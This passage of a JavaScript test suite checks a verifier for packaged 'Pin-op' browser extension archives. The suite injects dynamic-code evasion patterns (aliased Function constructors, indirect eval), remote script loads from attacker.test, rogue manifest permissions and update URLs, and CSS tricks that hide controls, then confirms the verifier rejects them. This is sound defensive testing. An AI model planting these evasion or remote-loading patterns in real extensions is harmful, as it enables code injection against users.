      'new Object.constructor("return 1")',
      'Function.prototype.constructor("return 1")()',
      '({}).constructor.constructor("return 1")()',
      'const localArrow = () => {}; localArrow.constructor("return 1")()',
      'function localFunction() {} localFunction.constructor("return 1")()',
      '[].filter.constructor("return 1")()',
      'Math.max.constructor("return 1")()',
      'Object.prototype.hasOwnProperty.constructor("return 1")()',
      'new ([].filter.constructor)("return 1")',
      '[].filter.constructor`return 1`()',
      'const ConstructorAlias = [].filter.constructor; ConstructorAlias("return 1")()',
      'const assignedSource = () => {}; let AssignedConstructor; AssignedConstructor = assignedSource.constructor; AssignedConstructor("return 1")()',
      'class DangerousDescribe { describe(code) { const Constructor = this.constructor; return Constructor(code); } }',
      'class DangerousClone { describe(code) { const Constructor = this.constructor; return new Constructor(code); } }',
      'class CopiedSchema { describe(description) { const Constructor = this.constructor; return new Constructor({...this._def, description}); } } function LocalFunction() {} LocalFunction._def = { toString() { return "return 1"; } }; CopiedSchema.prototype.describe.call(LocalFunction, "x")()',
      'class CopiedPrimitiveSchema { describe(description) { const Constructor = this.constructor; return new Constructor({...this._def, description}); } } function PrimitiveFunction() {} PrimitiveFunction._def = { [Symbol.toPrimitive]() { return "return 1"; } }; CopiedPrimitiveSchema.prototype.describe.call(PrimitiveFunction, "x")()',
      'Function`return 1`()',
      'Object.constructor`return 1`()',
      'let assignedFunction; assignedFunction = Function; assignedFunction("return 1")()',
      'let assignedEval; assignedEval = eval; assignedEval("1")',
      'let assignedLoader; assignedLoader = importScripts; assignedLoader("https://attacker.test/ui.js")',
      'const evalKey = "eval"; globalThis[evalKey]("1")',
      'const functionKey = "Function"; globalThis[functionKey]("return 1")()',
      'const loaderKey = "importScripts"; self[loaderKey]("https://attacker.test/ui.js")',
      'let constructorKey; constructorKey = "constructor"; (() => {})[constructorKey]("return 1")()',
      'const { Function: destructuredFunction } = globalThis; destructuredFunction("return 1")()',
      'const { eval: destructuredEval } = globalThis; destructuredEval("1")',
      '(capability => capability("return 1")())(Function)',
      '(() => Function)()("return 1")()',
    ]) {
      const archive = browserArchive(browser);
      const path = "dist/inspectorPanel.js";
      const bundle = archive.files.get(path).toString("utf8");
      archive.files.set(path, Buffer.from(`${bundle}\n${marker}\n`));

      try {
        validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        );
        accepted.push(marker);
      } catch (error) {
        if (!/(?:dynamic code|remote code)/i.test(String(error))) {
          wrongReason.push(`${marker}: ${String(error)}`);
        }
      }
    }

    assert.deepEqual(wrongReason, []);
    assert.deepEqual(accepted, []);
  });

  test(`common ${browser} artifact verifier allows only the exact esbuild Function helper`, () => {
    const archive = browserArchive(browser);
    const path = "dist/inspectorPanel.js";
    const bundle = archive.files.get(path).toString("utf8");
    archive.files.set(
      path,
      Buffer.from(`${bundle}\n` +
        "const safeHasOwn = Function.call.bind(Object.prototype.hasOwnProperty);\n"),
    );

    assert.doesNotThrow(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
    );
  });


  test(`common ${browser} artifact verifier rejects a copied schema clone constructor pattern`, () => {
    const archive = browserArchive(browser);
    const path = "dist/inspectorPanel.js";
    const bundle = archive.files.get(path).toString("utf8");
    archive.files.set(
      path,
      Buffer.from(`${bundle}\n` +
        "class SafeSchema {\n" +
        "  describe(description) {\n" +
        "    const Constructor = this.constructor;\n" +
        "    return new Constructor({\n" +
        "      ...this._def,\n" +
        "      description,\n" +
        "    });\n" +
        "  }\n" +
        "}\n"),
    );

    assert.throws(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /dynamic code evaluation/i,
    );
  });

  test(`common ${browser} artifact verifier rejects invalid bundle syntax`, () => {
    for (const path of [
      "dist/background.js",
      "dist/contentScript.js",
      "dist/devtools.js",
      "dist/inspectorPanel.js",
      "dist/chromiumElementsRuntime.js",
    ]) {
      const archive = browserArchive(browser);
      const bundle = archive.files.get(path).toString("utf8");
      archive.files.set(path, Buffer.from(`${bundle}\nif (\n`));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /invalid static JavaScript/i,
        path,
      );
    }
  });

  test(`common ${browser} artifact verifier ignores inert dynamic-code text`, () => {
    for (const path of [
      "dist/background.js",
      "dist/contentScript.js",
      "dist/devtools.js",
      "dist/inspectorPanel.js",
      "dist/chromiumElementsRuntime.js",
    ]) {
      for (const marker of [
        'const dynamicCodeDocumentation = "eval(\\"text only\\") and new Function";\n' +
          '// import("https://attacker.test/text-only.js")',
        'function harmless(eval) { return eval + 1; } harmless(1);',
        'const harmlessFunction = () => 1; const Function = harmlessFunction; Function();',
        'const harmlessGlobal = { eval: () => 1 }; harmlessGlobal.eval();',
        'const callable = () => 1; void (callable instanceof Function);',
        'const inertConstructor = ({ value: 1 }).constructor; void inertConstructor;',
        'const inertObject = { constructor: 1 }; void inertObject.constructor;',
        'const inertCapabilityName = "eval"; void inertCapabilityName;',
        'const inertConstructorName = "constructor"; const inertConstructorRead = ({ value: 1 })[inertConstructorName]; void inertConstructorRead;',
        'const localMethodName = "run"; const localRunner = { run() { return 1; } }; localRunner[localMethodName]();',
        'let assignedMethodName; assignedMethodName = "run"; const assignedRunner = { run() { return 1; } }; assignedRunner[assignedMethodName]();',
      ]) {
        const archive = browserArchive(browser);
        const bundle = archive.files.get(path).toString("utf8");
        archive.files.set(path, Buffer.from(`${bundle}\n${marker}\n`));

        assert.doesNotThrow(
          () => validateBrowserArchive(
            archive,
            `pin-op-${browser}-0.5.0.zip`,
            browser,
          ),
          `${path}: ${marker}`,
        );
      }
    }
  });

  test(`common ${browser} artifact verifier requires exact ordered permissions`, () => {
    for (const mutate of [
      (manifest) => { manifest.permissions.pop(); },
      (manifest) => { manifest.permissions.reverse(); },
      (manifest) => { manifest.permissions.push("bookmarks"); },
      (manifest) => { manifest.permissions.push("debugger"); },
      (manifest) => { manifest.permissions.push("nativeMessaging"); },
    ]) {
      const archive = browserArchive(browser);
      const manifest = JSON.parse(archive.files.get("manifest.json").toString("utf8"));
      mutate(manifest);
      archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /unexpected manifest permissions/i,
      );
    }
  });

  test(`common ${browser} artifact verifier requires the exact extension CSP`, () => {
    for (const mutate of [
      (manifest) => { manifest.content_security_policy.extension_pages += " https://attacker.test"; },
      (manifest) => { delete manifest.content_security_policy; },
    ]) {
      const archive = browserArchive(browser);
      const manifest = JSON.parse(archive.files.get("manifest.json").toString("utf8"));
      mutate(manifest);
      archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /unexpected manifest content security policy/i,
      );
    }
  });

  test(`common ${browser} artifact verifier requires complete Chromium-derived notices`, () => {
    const complete = chromiumNoticeFixture();
    for (const marker of [
      `Pinned revision: ${upstreamManifest.revision}`,
      upstreamRootLicense,
      "Copyright (C) 2009 Joseph Pecoraro",
      `NPM package: chrome-devtools-frontend@${nativeRuntime.package.version}`,
      `Package gitHead: ${nativeRuntime.package.gitHead}`,
      `Rules overlay manifest SHA-256: ${sha256(nativeStylesManifestBytes)}`,
      `- ${nativeStylesManifest.entryPoint} ${nativeStylesManifest.overlayFiles[nativeStylesManifest.entryPoint]}`,
      nativeCodeMirrorLicense,
    ]) {
      const archive = browserArchive(browser);
      archive.files.set("THIRD_PARTY_NOTICES", Buffer.from(complete));
      const incomplete = complete.replace(marker, "removed notice input");
      assert.notEqual(incomplete, complete, marker);
      archive.files.set("THIRD_PARTY_NOTICES", Buffer.from(incomplete));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /incomplete Chromium-derived notices/i,
        marker.slice(0, 80),
      );
    }
  });

  test(`common ${browser} artifact verifier requires exact ordered host permissions and no optionals`, () => {
    for (const mutate of [
      (manifest) => { manifest.host_permissions.pop(); },
      (manifest) => { manifest.host_permissions.reverse(); },
      (manifest) => manifest.host_permissions.push("https://attacker.test/*"),
      (manifest) => { manifest.optional_permissions = ["debugger"]; },
      (manifest) => { manifest.optional_host_permissions = ["<all_urls>"]; },
    ]) {
      const archive = browserArchive(browser);
      const manifest = JSON.parse(archive.files.get("manifest.json").toString("utf8"));
      mutate(manifest);
      archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /unexpected manifest (?:host|optional)/i,
      );
    }
  });

  test(`common ${browser} artifact verifier rejects unapproved manifest capabilities`, () => {
    const expectedKeys = [
      "background",
      ...(browser === "firefox" ? ["browser_specific_settings"] : []),
      "content_security_policy",
      "description",
      "devtools_page",
      "host_permissions",
      "icons",
      "manifest_version",
      ...(browser === "chrome" ? ["minimum_chrome_version"] : []),
      "name",
      "permissions",
      "version",
    ].sort();
    const approved = JSON.parse(
      browserArchive(browser).files.get("manifest.json").toString("utf8"),
    );
    assert.deepEqual(Object.keys(approved).sort(), expectedKeys);

    for (const mutate of [
      (manifest) => { manifest.commands = { attack: { suggested_key: "Ctrl+A" } }; },
      (manifest) => { manifest.externally_connectable = { matches: ["<all_urls>"] }; },
      (manifest) => { manifest.web_accessible_resources = [{ resources: ["dist/inspectorPanel.js"], matches: ["<all_urls>"] }]; },
      (manifest) => { manifest.x_pin_op_test_capability = true; },
      (manifest) => { manifest.content_scripts = [{ matches: ["<all_urls>"], js: ["dist/inspectorPanel.js"] }]; },
    ]) {
      const archive = browserArchive(browser);
      const manifest = JSON.parse(archive.files.get("manifest.json").toString("utf8"));
      mutate(manifest);
      archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /unexpected manifest (?:capability|key)/i,
      );
    }
  });

  test(`common ${browser} artifact verifier requires exact platform entrypoints`, () => {
    for (const mutate of [
      (manifest) => { delete manifest.devtools_page; },
      (manifest) => { manifest.devtools_page = "https://attacker.test/devtools.html"; },
      (manifest) => { delete manifest.background; },
      (manifest) => {
        manifest.background = browser === "chrome"
          ? { service_worker: "dist/inspectorPanel.js" }
          : { scripts: ["dist/inspectorPanel.js"] };
      },
    ]) {
      const archive = browserArchive(browser);
      const manifest = JSON.parse(archive.files.get("manifest.json").toString("utf8"));
      mutate(manifest);
      archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /unexpected manifest (?:devtools page|background)/i,
      );
    }
  });

  test(`common ${browser} artifact verifier rejects protocol v5 metadata`, () => {
    const archive = browserArchive(browser);
    archive.files.set(
      "dist/runtime-metadata.json",
      Buffer.from('{"schemaVersion":1,"protocolVersion":5}\n'),
    );

    assert.throws(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /runtime metadata protocolVersion expected 7 but found 5/i,
    );
  });

  test(`common ${browser} artifact verifier rejects literal local paths`, () => {
    for (const [path, literal, expectedError] of [
      [
        "dist/inspectorPanel.js",
        'const leaked = "file:///private/workspace/card.scss";',
        /local file URI/i,
      ],
      [
        "dist/background.js",
        'const leaked = "C:\\\\private\\\\workspace\\\\card.scss";',
        /local drive path/i,
      ],
      [
        "dist/inspectorPanel.js",
        'const leaked = "\\\\\\\\server\\\\share\\\\card.scss";',
        /local UNC path/i,
      ],
      [
        "dist/inspectorPanel.js",
        'const leaked = "\\\\\\\\server\\\\_private\\\\card.scss";',
        /local UNC path/i,
      ],
      [
        "dist/contentScript.js",
        'const leaked = "\\\\\\\\?\\\\C:\\\\private\\\\workspace\\\\card.scss";',
        /local (?:Windows device|drive) path/i,
      ],
      [
        "dist/contentScript.js",
        'const leaked = "\\\\\\\\.\\\\pipe\\\\pin-op";',
        /local Windows device path/i,
      ],
      [
        "dist/contentScript.js",
        String.raw`// built from \\.\pipe\pin-op`,
        /local Windows device path/i,
      ],
      [
        "dist/contentScript.js",
        'const leaked = `prefix=file:///home/alice/${name}.scss`;',
        /local file URI/i,
      ],
      [
        "dist/devtools.js",
        "//# sourceURL=file:///home/alice/private/devtools.js",
        /local file URI/i,
      ],
      [
        "dist/contentScript.js",
        'const leaked = "prefix=C:\\\\Users\\\\alice\\\\private\\\\card.scss";',
        /local drive path/i,
      ],
      [
        "dist/background.js",
        "// built from /home/alice/private/card.scss",
        /local POSIX path/i,
      ],
      [
        "dist/inspector-panel.html",
        "<!-- built from /Users/alice/private/panel.html -->",
        /local POSIX path/i,
      ],
      [
        "dist/panel.css",
        "/* built from /workspace/private/panel.css */",
        /local POSIX path/i,
      ],
      [
        "dist/pin-op.svg",
        "<!-- built from /mnt/c/private/pin-op.svg -->",
        /local POSIX path/i,
      ],
    ]) {
      const archive = browserArchive(browser);
      archive.files.set(
        path,
        Buffer.from(`${archive.files.get(path).toString("utf8")}\n${literal}\n`),
      );
      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        expectedError,
      );
    }
  });

  test(`common ${browser} artifact verifier allows package-relative and public paths`, () => {
    const archive = browserArchive(browser);
    archive.files.set(
      "dist/devtools.js",
      Buffer.from(
        `${archive.files.get("dist/devtools.js").toString("utf8")}\n` +
          'const safe = ["file:", "file:///", "C:", "./card.scss", "/assets/panel.html", ' +
          '"/assets/card.css", "https://example.test/home/card.css"];\n' +
          'const cssEscape = /(^|\\\\+)?(\\\\[A-F0-9]{1,6})\\x20/;\n',
      ),
    );
    assert.doesNotThrow(() => validateBrowserArchive(
      archive,
      `pin-op-${browser}-0.5.0.zip`,
      browser,
    ));
  });

  test(`common ${browser} artifact verifier rejects Rules aliases and acknowledgements`, () => {
    for (const mutate of [
      (source) => source.replace('const rulesOpenType = "rules.open";\n', ""),
      (source) => source.replace('"rules.open"', '"rules.opened"'),
      (source) => `${source}\nconst inventedAck = "rules.opened";\n`,
    ]) {
      const archive = browserArchive(browser);
      const source = archive.files.get("dist/background.js").toString("utf8");
      archive.files.set("dist/background.js", Buffer.from(mutate(source)));
      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /Rules source open|Rules open acknowledgement|rules\.opened/i,
      );
    }
  });

  for (const { label, path, marker } of requiredMarkers) {
    test(`common ${browser} artifact verifier requires ${label}`, () => {
      const archive = browserArchive(browser);
      const original = archive.files.get(path).toString("utf8");
      const withoutMarker = original.replaceAll(
        marker,
        marker.endsWith(":")
          ? "missingContractMarker:"
          : "missing-contract-marker",
      );
      assert.notEqual(withoutMarker, original);
      assert.equal(withoutMarker.includes(marker), false);
      archive.files.set(path, Buffer.from(withoutMarker));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        new RegExp(`${label}.*${escapeRegex(marker)}`, "i"),
      );
    });
  }

  test(`common ${browser} artifact verifier requires exact Pin-op icons`, () => {
    const archive = browserArchive(browser);
    const manifest = JSON.parse(archive.files.get("manifest.json").toString("utf8"));
    manifest.icons[128] = "dist/icons/unexpected.png";
    archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

    assert.throws(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /unexpected manifest icons/i,
    );
  });

  test(`common ${browser} artifact verifier validates Pin-op PNG dimensions`, () => {
    const archive = browserArchive(browser);
    archive.files.set("dist/icons/pin-op-48.png", Buffer.from("not a png"));

    assert.throws(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /pin-op-48\.png.*valid PNG/i,
    );
  });

  test(`common ${browser} artifact verifier requires the Pin-op display name`, () => {
    const archive = browserArchive(browser);
    const manifest = JSON.parse(archive.files.get("manifest.json").toString("utf8"));
    manifest.name = ["Pin", "Op"].join("");
    archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

    assert.throws(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /unexpected manifest name/i,
    );
  });

  test(`common ${browser} artifact verifier requires the product description`, () => {
    const archive = browserArchive(browser);
    const manifest = JSON.parse(archive.files.get("manifest.json").toString("utf8"));
    manifest.description = "Connect browser DevTools to your source code.";
    archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

    assert.throws(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /unexpected manifest description/i,
    );
  });


  test(`common ${browser} artifact verifier requires visible Pin-op panel identity`, () => {
    const archive = browserArchive(browser);
    const panel = archive.files.get("dist/inspector-panel.html").toString("utf8");
    const legacyPanel = panel.replaceAll("Pin-op", ["Pin", "Op"].join(""));
    assert.notEqual(legacyPanel, panel);
    archive.files.set("dist/inspector-panel.html", Buffer.from(legacyPanel));

    assert.throws(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /panel must present Pin-op in its title/i,
    );
  });

  test(`common ${browser} artifact verifier requires exactly one toolbar`, () => {
    const archive = browserArchive(browser);
    const panel = archive.files.get("dist/inspector-panel.html").toString("utf8");
    archive.files.set(
      "dist/inspector-panel.html",
      Buffer.from(
        `${panel}\n<header class="secondary panel-toolbar"></header>\n`,
      ),
    );

    assert.throws(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /toolbar.*exactly one/i,
    );
  });

  test(`common ${browser} artifact verifier decodes toolbar class character references`, () => {
    for (const encodedClass of [
      "secondary panel&#45;toolbar",
      "secondary panel&#x2d;toolbar",
      "secondary&Tab;panel-toolbar",
    ]) {
      const archive = browserArchive(browser);
      const panel = archive.files.get("dist/inspector-panel.html").toString("utf8");
      archive.files.set(
        "dist/inspector-panel.html",
        Buffer.from(`${panel}\n<header class="${encodedClass}"></header>\n`),
      );

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /toolbar.*exactly one/i,
        encodedClass,
      );
    }
  });

  test(`common ${browser} artifact verifier rejects hidden connection controls`, () => {
    for (const [name, source, replacement] of [
      [
        "hidden link code",
        '<input id="link-code"',
        '<input hidden id="link-code"',
      ],
      [
        "aria-hidden link controls",
        '<section id="link-controls"',
        '<section aria-hidden="true" id="link-controls"',
      ],
    ]) {
      const archive = browserArchive(browser);
      const panel = archive.files.get("dist/inspector-panel.html").toString("utf8");
      const hidden = panel.replace(source, replacement);
      assert.notEqual(hidden, panel, name);
      archive.files.set("dist/inspector-panel.html", Buffer.from(hidden));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /connection controls.*visible/i,
        name,
      );
    }
  });

  test(`common ${browser} artifact verifier rejects controls hidden by packaged CSS`, () => {
    for (const [name, rule] of [
      [
        "ID display rule",
        "#link-code { DISPLAY/**/:/**/NONE !IMPORTANT; }",
      ],
      [
        "class visibility rule",
        ".connection/**/ { VISIBILITY : hidden; }",
      ],
      [
        "element content-visibility rule",
        "section { content-visibility : HIDDEN; }",
      ],
      [
        "self custom property",
        "#link-code { --hide:none; display:var(--hide)!important }",
      ],
      [
        "commented mixed-case custom property",
        "#link-code { --hide:/**/NONE; " +
          "display:VaR(/**/--hide) !IMPORTANT; }",
      ],
      [
        "root custom property",
        ":root { --hide: hidden; } #link-code { visibility: var(--hide); }",
      ],
      [
        "ancestor custom property",
        ".connection-summary { --hide: hidden; } " +
          "#link-code { content-visibility: var(--hide); }",
      ],
      [
        "custom property fallback",
        "#link-code { display: var(--missing, NONE) !important; }",
      ],
      [
        "nested custom property fallback",
        "#link-code { display: var(--missing, var(--also-missing, none)); }",
      ],
      [
        "unresolved custom property",
        "#link-code { display: var(--missing) !important; }",
      ],
      [
        "collapsed visibility",
        "#link-code { visibility:collapse!important }",
      ],
      [
        "important cascade",
        "#link-code { display: none !important; } " +
          "#link-code { display: block; }",
      ],
    ]) {
      const archive = browserArchive(browser);
      const css = archive.files.get("dist/panel.css").toString("utf8");
      archive.files.set("dist/panel.css", Buffer.from(`${css}\n${rule}\n`));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /connection controls.*visible/i,
        name,
      );
    }
  });

  for (const [name, rules] of [
    [
      "media hidden branch before false visible branch",
      "@media all { #link-code { display: none !important; } } " +
        "@media not all { #link-code { display: block !important; } }",
    ],
    [
      "media false visible branch before hidden branch",
      "@media not all { html #link-code { display: block !important; } } " +
        "@media all { #link-code { display: none !important; } }",
    ],
    [
      "supports true and false-shaped branches",
      "@supports (display: grid) { " +
        "#link-code { display: none !important; } } " +
        "@supports not (display: grid) { " +
        "html #link-code { display: block !important; } }",
    ],
    [
      "reversed important layer order",
      "@layer contract, override; " +
        "@layer contract { #link-code { display: none !important; } } " +
        "@layer override { html #link-code { display: block !important; } }",
    ],
    [
      "layered important declaration before unlayered fallback",
      "@layer contract { #link-code { display: none !important; } } " +
        "html #link-code { display: block !important; }",
    ],
    [
      "conditional custom property branch",
      "@media all { :root { --conditional-display: none; } } " +
        "@media not all { :root { --conditional-display: block; } } " +
        "#link-code { display: var(--conditional-display) !important; }",
    ],
    [
      "nested mixed-case conditional layers",
      "@MeDiA/**/ all { @SuPpOrTs (display: grid) { @LaYeR contract { " +
        "#link-code { VISIBILITY:/**/COLLAPSE !ImPoRtAnT; } } } } " +
        "@media not all { html #link-code { visibility: visible !important; } }",
    ],
  ]) {
    test(`common ${browser} artifact verifier rejects ${name}`, () => {
      const archive = browserArchive(browser);
      const css = archive.files.get("dist/panel.css").toString("utf8");
      archive.files.set("dist/panel.css", Buffer.from(`${css}\n${rules}\n`));

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /connection controls.*visible/i,
        name,
      );
    });
  }

  test(`common ${browser} artifact verifier rejects controls hidden by inline style blocks`, () => {
    for (const [name, rule] of [
      [
        "literal inline style",
        "#link-code{display:none!important}",
      ],
      [
        "variable inline style",
        ":root{--hide:collapse}#link-code{visibility:var(--hide)!important}",
      ],
    ]) {
      const archive = browserArchive(browser);
      const panel = archive.files.get("dist/inspector-panel.html").toString("utf8");
      archive.files.set(
        "dist/inspector-panel.html",
        Buffer.from(
          panel.replace("</head>", `<style>${rule}</style>\n</head>`),
        ),
      );

      assert.throws(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        /inline style/i,
        name,
      );
    }
  });

  test(`common ${browser} artifact verifier accepts visible cascades and unrelated styles`, () => {
    for (const [name, rules] of [
      [
        "ancestor custom property override",
        ":root { --display: none; } " +
          ".connection-summary { --display: inline-block; } " +
          "#link-code { display: var(--display); }",
      ],
      [
        "self custom property override",
        ".connection-summary { --visibility: collapse; } " +
          "#link-code { --visibility: visible; visibility: var(--visibility); }",
      ],
      [
        "winning visible declaration",
        "#link-code { display: none; display: var(--missing); } " +
          "#link-code { display: block; }",
      ],
      [
        "winning visible important declaration",
        "#link-code { display: none !important; } " +
          "#link-code { display: block !important; }",
      ],
      [
        "unrelated styles",
        ".unrelated { display: var(--missing) !important; " +
          "visibility: collapse !important; }",
      ],
      [
        "unrelated conditional styles",
        "@media all { @supports (display: grid) { @layer unrelated { " +
          ".unrelated { display: none !important; } } } }",
      ],
    ]) {
      const archive = browserArchive(browser);
      const css = archive.files.get("dist/panel.css").toString("utf8");
      archive.files.set(
        "dist/panel.css",
        Buffer.from(`${css}\n${rules}\n`),
      );
      assert.doesNotThrow(
        () => validateBrowserArchive(
          archive,
          `pin-op-${browser}-0.5.0.zip`,
          browser,
        ),
        name,
      );
    }
  });

  test(`common ${browser} artifact verifier rejects controls outside the toolbar`, () => {
    const archive = browserArchive(browser);
    const panel = archive.files.get("dist/inspector-panel.html").toString("utf8");
    archive.files.set(
      "dist/inspector-panel.html",
      Buffer.from(moveElementAfterToolbar(panel, "paste-button")),
    );

    assert.throws(
      () => validateBrowserArchive(
        archive,
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      ),
      /connection controls.*paste-button.*connection-summary/i,
    );
  });
}

test("common Firefox artifact verifier preserves the Gecko extension ID", () => {
  const archive = browserArchive("firefox");
  const manifest = JSON.parse(archive.files.get("manifest.json").toString("utf8"));
  manifest.browser_specific_settings.gecko.id = "pin-op@example.test";
  archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

  assert.throws(
    () => validateBrowserArchive(archive, "pin-op-firefox-0.5.0.zip", "firefox"),
    /unexpected Firefox (?:Gecko ID|browser_specific_settings)/i,
  );
});

test("common Firefox artifact verifier requires exact Gecko settings", () => {
  for (const mutate of [
    (manifest) => {
      delete manifest.browser_specific_settings.gecko.data_collection_permissions;
    },
    (manifest) => {
      manifest.browser_specific_settings.gecko
        .data_collection_permissions.required.reverse();
    },
    (manifest) => {
      manifest.browser_specific_settings.gecko
        .data_collection_permissions.required.push("none");
    },
    (manifest) => {
      manifest.browser_specific_settings.gecko
        .data_collection_permissions.optional = ["technicalAndInteraction"];
    },
    (manifest) => {
      manifest.browser_specific_settings.gecko.update_url =
        "https://attacker.test/update.json";
    },
    (manifest) => {
      manifest.browser_specific_settings.injected = true;
    },
  ]) {
    const archive = browserArchive("firefox");
    const manifest = JSON.parse(
      archive.files.get("manifest.json").toString("utf8"),
    );
    mutate(manifest);
    archive.files.set("manifest.json", Buffer.from(JSON.stringify(manifest)));

    assert.throws(
      () => validateBrowserArchive(
        archive,
        "pin-op-firefox-0.5.0.zip",
        "firefox",
      ),
      /unexpected Firefox browser_specific_settings/i,
    );
  }
});

function browserArchive(browser, panelPage = currentBrowserPanelPage(browser)) {
  const files = new Map(
    BROWSER_ARCHIVE_FILES.map((path) => [path, Buffer.from(`fixture ${path}`)]),
  );
  files.set("LICENSE", readFileSync(resolve(repositoryRoot, "LICENSE")));
  files.set(
    "THIRD_PARTY_NOTICES",
    Buffer.from(chromiumNoticeFixture()),
  );
  files.set(
    "manifest.json",
    readFileSync(resolve(repositoryRoot, `extensions/${browser}/manifest.json`)),
  );
  files.set("dist/inspector-panel.html", Buffer.from(inspectorPanelHtml));
  files.set("dist/panel.css", Buffer.from(panelCss));
  files.set("dist/devtools-elements.css", Buffer.from(elementsCss));
  for (const path of [
    "dist/background.js",
    "dist/contentScript.js",
    "dist/devtools.js",
  ]) {
    files.set(
      path,
      Buffer.from(
        path === "dist/background.js"
          ? `${backgroundBundle}\n${compiledPanelRuntime(panelPage)}`
          : path === "dist/devtools.js"
            ? compiledPanelRuntime(panelPage)
            : contentScriptBundle,
      ),
    );
  }
  files.set("dist/inspectorPanel.js", Buffer.from(inspectorPanelBundle));
  files.set(
    "dist/chromiumElementsRuntime.js",
    Buffer.from(chromiumElementsRuntimeBundle),
  );
  files.set(
    "dist/runtime-metadata.json",
    Buffer.from('{"schemaVersion":1,"protocolVersion":7}\n'),
  );
  for (const size of [16, 32, 48, 96, 128]) {
    files.set(
      `dist/icons/pin-op-${size}.png`,
      readFileSync(
        resolve(
          repositoryRoot,
          `packages/browser-extension-core/assets/icons/pin-op-${size}.png`,
        ),
      ),
    );
  }
  return { files, paths: [...BROWSER_ARCHIVE_FILES] };
}

function currentBrowserPanelPage(browser) {
  const accepted = acceptedBrowserPanelPages.get(browser);
  if (accepted) return accepted;
  const failures = [];
  for (const panelPage of [INSPECTOR_PANEL_PAGE]) {
    try {
      validateBrowserArchive(
        browserArchive(browser, panelPage),
        `pin-op-${browser}-0.5.0.zip`,
        browser,
      );
      acceptedBrowserPanelPages.set(browser, panelPage);
      return panelPage;
    } catch (error) {
      failures.push(error);
    }
  }
  throw new AggregateError(
    failures,
    `No ${browser} panel fixture satisfies the current runtime contract`,
  );
}

function chromiumNoticeFixture() {
  return [
    "# Third-Party Notices",
    "",
    chromiumDerivedNoticeSection,
    "",
    chromiumNativeRuntimeNoticeSection,
    "",
  ].join("\n");
}

function sha256(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}

function escapeRegex(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function moveElementAfterToolbar(panel, id) {
  const start = panel.indexOf(`<button id="${id}"`);
  const end = panel.indexOf("</button>", start) + "</button>".length;
  assert.ok(start >= 0 && end >= "</button>".length);
  const element = panel.slice(start, end);
  const withoutElement = panel.slice(0, start) + panel.slice(end);
  return withoutElement.replace("</header>", `</header>\n${element}`);
}
